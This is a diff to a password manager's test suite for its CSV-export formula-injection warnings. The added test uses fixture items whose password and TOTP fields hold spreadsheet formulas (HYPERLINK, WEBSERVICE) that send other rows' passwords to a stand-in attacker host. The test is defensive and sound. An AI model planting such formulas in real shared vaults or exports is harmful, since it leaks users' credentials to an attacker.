@@ -318,8 +318,8 @@ describe("csvWarnings (spec 07 §1 — by NAME, independent categories)", () => 
       { type: "login", name: "Leading space", login: { username: " =1+1", password: "p" } },
       // A note is never WRITTEN to the CSV, so a formula in one cannot evaluate there.
       { type: "note", name: "=NoteName", notes: "=1+1" },
-      // The password column is deliberately out of scope: a generated password that starts
-      // with `-` is ordinary, and a list that fires on most exports is ignored.
+      // Every written cell counts, the password included (security review 2026-10): a
+      // co-member authors shared passwords, so the old exemption was the attacker's cell.
       { type: "login", name: "Dash password", login: { username: "u", password: "-Xk7#mQ2" } },
       { type: "login", name: "Fine", login: { username: "u", password: "p", uris: ["https://c.test"] } },
     ] as unknown as ItemDoc[];
@@ -329,12 +329,28 @@ describe("csvWarnings (spec 07 §1 — by NAME, independent categories)", () => 
       "At url",
       "Minus note",
       "Leading space",
+      "Dash password",
     ]);
     expect(csvWarnings(docs).noteItems).toEqual(["=NoteName"]);
     // The copy is a byte-twin of core ExportCsv.FORMULA_WARNING, and it ends in a colon so
     // the panel appends the names like every other category.
     expect(CSV_FORMULA_WARNING.endsWith(":")).toBe(true);
     expect(CSV_FORMULA_WARNING).toContain("text editor");
+  });
+
+  /**
+   * Security review 2026-10 (root cause D): a co-member authors the password and TOTP cells of the
+   * shared logins they create; writeCsv emits them verbatim, and a formula there reads the OTHER
+   * rows (the victim's own passwords). The warning now covers every cell the writer emits. Twin of
+   * core ExportTest.csv_warnings_formulaRisk_coversThePasswordAndTotpCells.
+   */
+  it("formulaRisk covers the password and totp cells", () => {
+    const docs = [
+      { type: "login", name: "Shared bank", login: { username: "u", password: '=HYPERLINK("https://evil.test/?d="&D2:D999,"Reset")' } },
+      { type: "login", name: "Shared mail", login: { username: "u", password: "p", totp: '@WEBSERVICE("https://evil.test")' } },
+      { type: "login", name: "Fine", login: { username: "u", password: "p", totp: "otpauth://totp/x?secret=AAAA" } },
+    ] as unknown as ItemDoc[];
+    expect(csvWarnings(docs).formulaRisk).toEqual(["Shared bank", "Shared mail"]);
   });
 
   it("startsWithFormulaChar matches what a spreadsheet parses", () => {
